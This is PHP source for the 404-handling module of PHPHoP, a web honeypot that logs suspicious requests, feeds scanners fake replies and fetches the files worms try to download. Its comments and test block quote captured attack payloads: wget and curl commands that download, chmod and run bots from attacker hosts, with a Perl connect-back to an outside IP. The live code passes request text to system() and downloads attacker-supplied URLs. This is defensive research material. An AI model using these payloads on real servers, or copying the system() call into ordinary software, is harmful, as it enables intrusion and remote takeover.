<?
//
//  This file is part of PHPHoP, the PHP Honeypot Project
//
//  Copyright oudot@rstack.org 2005-2006
//
// Developpers :
//		 jamesr@europe.com - Jamie Riden 
//		 oudot@rstack.org  - Laurent Oudot
//
// This script is used to handle 404 errors so that you can catch
// almost any new web based worms or autohack tools (0d...)
//
//
// Install : create a ".htaccess" containing the following line (without '//')
// ErrorDocument	404	/hiphop.php
//
// Then, each time a web worm or a blackhat targets a file that does not exist
// on your web server (can be restricted to some sub directories only), you
// check if it contains weird commands (like "wget" stuff, seen in most worms...
//
// Examples of evil payload : 
//
// awstats:
// 	configdir=cd%20/tmp;wget%20192.168.1.69/cbac;chmod%20744%20cbac HTTP/1.1
//      configdir=%7cecho%20%3becho%20b_exp%3bwget%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%2etxt%3bmv%20ping%2etxt%20temp20\06%3bperl%20temp2006%20210%2e245%2e233%2e251%208080%3bwget%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3bcurl%20%2do%20ping%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3bcd%20%2ftmp%2f%3bcurl%20%2do%20temp2006%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%2etxt%3bwhile%20%5b%201%20%5d%3bdo%20perl%20temp2006%20210%2e245%2e233%2e251%208080%3bdone%3bwget%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3bcurl%20%2do%20ping%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3becho%20e_exp%3b%2500
// remote include:
// ?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://192.168.1.69/cmd.gif?&cmd=cd%20/tmp;wget%20192.168.1.68/listen;chmod%20744%20listen;./listen;echo%20YYY;echo|
// /board/skin/zero_vote/error.php?dir=http://www.members.example.uk/kaero/fbi.gif?&cmd=cd%20/tmp;curl%20-O%20www.members.example.uk/kaero/botperl;perl%20botperl

/* testing code

wget -O /tmp/test1.log "http://127.0.0.1/hop/doesntexist.php?configdir=cd%20/tmp;wget%20192.168.1.69/cbac;chmod%20744%20cbac"
wget -O /tmp/test2.log "http://127.0.0.1/hop/doesntexist.php?configdir=%7cecho%20%3becho%20b_exp%3bwget%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%2etxt%3bmv%20ping%2etxt%20temp2006%3bperl%20temp2006%20210%2e245%2e233%2e251%208080%3bwget%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3bcurl%20%2do%20ping%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3bcd%20%2ftmp%2f%3bcurl%20%2do%20temp2006%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%2etxt%3bwhile%20%5b%201%20%5d%3bdo%20perl%20temp2006%20210%2e245%2e233%2e251%208080%3bdone%3bwget%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3bcurl%20%2do%20ping%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3becho%20e_exp%3b%2500"
wget -O /tmp/test3.log "http://127.0.0.1/hop/doesntexist.php?include=http://www.members.example.uk/kaero/fbi.gif?&cmd=cd%20/tmp;curl%20-O%20www.members.example.uk/kaero/botperl;perl%20botperl"
wget -O /tmp/test4.log "http://127.0.0.1/hop/doesntexist.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path="http://192.168.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20192.168.40.113/listen;chmod%20744%20listen;./listen;echo%20YYY;echo|"

*/

$modulename="hiphop";

include_once("/var/www/hiphop/config.php");
include_once($pathlib."/libsystem.php");
include_once($pathlib."/liblogtodisk.php"); 
include_once($pathlib."/liblogbymail.php"); 
include_once($pathlib."/liblogtomysql.php");



$data=$_SERVER["REDIRECT_QUERY_STRING"];
//echo $data;
// $_SERVER["REDIRECT_URL"] . ( isset ( $_SERVER["REDIRECT_QUERY_STRING"] ) ? "?" . $_SERVER["REDIRECT_QUERY_STRING"] : ""


//
// Create a fake 404 answer
//
$s404 = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>
<H1>Not Found</H1>
The requested URL '.htmlspecialchars($_SERVER["REDIRECT_URL"]).' was not found on this server.<P>
<HR>
<ADDRESS>'.$GLOBALS["SERVER_SOFTWARE"].' Server at <A HREF="mailto:'.$GLOBALS["SERVER_ADMIN"].'">'.$GLOBALS["HTTP_HOST"].'</A> Port '.$GLOBALS["SERVER_PORT"].'</ADDRESS>
</BODY></HTML>';

//
// Create a stupid fake 200 answer that can be used to wake up some 
// nasty remote tools targetting your web server
//
$s200 = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD>
<TITLE>'.htmlspecialchars($_SERVER["REDIRECT_URL"]).'</TITLE>
</HEAD><BODY>
Welcome to '.
htmlspecialchars($_SERVER["REDIRECT_URL"]) . 
//htmlspecialchars(( isset ( $_SERVER["REDIRECT_QUERY_STRING"] ) ? "?" . $_SERVER["REDIRECT_QUERY_STRING"] : "")) .
'</BODY></HTML>';

//
// Create a stupid fake 200 answer for directories
//
$s200dir ='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML><HEAD>
<TITLE>Index of '.htmlspecialchars($_SERVER["REDIRECT_URL"]).'</TITLE>
</HEAD><BODY>
<H1>Index of '.htmlspecialchars($_SERVER["REDIRECT_URL"]).'</H1>
<UL><LI><A HREF=".."> Parent Directory</A></LI>
</UL><ADDRESS>'.$GLOBALS["SERVER_SOFTWARE"].' Server at <A HREF="mailto:'.$GLOBALS["SERVER_ADMIN"].'">'.$GLOBALS["HTTP_HOST"].'</A> Port '.$GLOBALS["SERVER_PORT"].'</ADDRESS></BODY></HTML>';

//
// Handle 200 answers
//
function s200() {
  global $s200dir;
  global $s200;
  header("HTTP/1.1 200 OK");
  if (preg_match("/\/$/",$_SERVER["REDIRECT_URL"]))
  {
    echo $s200dir;
  } 
  else
  {
    echo $s200;
  }

}

//
// Handle 404 answers
//
function s404() {
  global $s404;
  header("HTTP/1.1 404 Not Found");
  echo $s404;
}


//
// We want to handle HTTP headers properly, so that we buffer the answer before
// sending it back to the HTTP client
//
ob_start();


//
// Main part of HiP HoP
//

redirect_logtomysql($modulename,$data,$mysqlhost,$mysqltcpport,$mysqlsocket,$mysqluser,$mysqlpassword,$mysqldatabase,$mysqlalertstable,$mysqlhoneypotstable);

$decoded=urldecode($data);
$mydownload="";


$op=true;

// need to properly handle all different commands - uname, id, etc
if (ereg("uname -a;",$decoded,$regs)) {

  // log it
  $args=$regs[1];
  system("uname $args");


} else {
  if (ereg("id",$decoded)) {

    // log it 
    system("id");

  } else {

    // wget is by far the most common
    if (ereg("wget ([^;]+);",$decoded,$regs)) {

      $mydownload = $regs[1];
      if (!ereg('^[^0-9:\.A-Za-z/ ]$',$mydownload ) && strlen($mydownload )>1 ) {
	download("wget",$mydownload);      
      }

    } else {

      // curl, followed by one or more options before url
      if (ereg("curl.+ ([^-][^;]+);",$decoded,$regs)) {

	$mydownload = $regs[1];
	if (!ereg('^[^0-9:\.A-Za-z/ ]$',$mydownload ) && strlen($mydownload )>1 ) {
	  download("wget",$mydownload);      
	}

      } else {
	$op = false;
      }
    }
  }
}

//
// Some scanners might reveal their name by default
// Let's play with them, and always answer with a 200 HTTP reply
//
if (preg_match("/nikto|nessus/i",$GLOBALS["HTTP_USER_AGENT"]))
{  
  s200();
}


//
// If the visitor sent a non null referer and targets a non existent file
// the current script will be called, and we can believe that he is a legit.
// Then we answer them with a friendly 404 error (in case a web page is indexed
// but deleted, or in case a link is broken (legit browser ?))
//
else if(isset($GLOBALS["HTTP_REFERER"]) && !preg_match("/\/$/",$_SERVER["REDIRECT_URL"]))
{ 
  s404();
} 

//
// Scanners, web worms, manual haxors, etc, won't probably have a REFERER set
// We answer to them with a stupid 200 answer, so that they get more results.
// Thanks to that behavior, it will fill of garbage the results of tools like 
// security scanners (nikto..), web worms, etc.
// If they target a directory (like /secret/ or whatever) we answer that way.
//
else 
{
  s200();
}

//
// Now let's flush our final answer, with correct headers
//
ob_end_flush();



?>
